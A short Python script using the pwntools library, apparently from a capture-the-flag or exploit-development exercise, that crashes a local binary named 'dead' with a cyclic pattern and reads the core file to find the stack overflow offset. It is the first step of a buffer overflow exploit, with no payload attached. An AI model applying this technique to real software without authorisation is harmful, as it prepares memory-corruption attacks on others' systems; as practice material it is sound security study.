from pwn import *

def find_offset():
	p = process('./dead')

	payload = cyclic(500)  # "aaaabaaacaaa..."
	p.sendline(payload)

	p.wait() # wait for crash

	crash_pattern = p.corefile.read(p.corefile.sp, 4) # "aaja"
	offset = cyclic_find(crash_pattern)
	return offset

offset = find_offset()
print(offset) # 40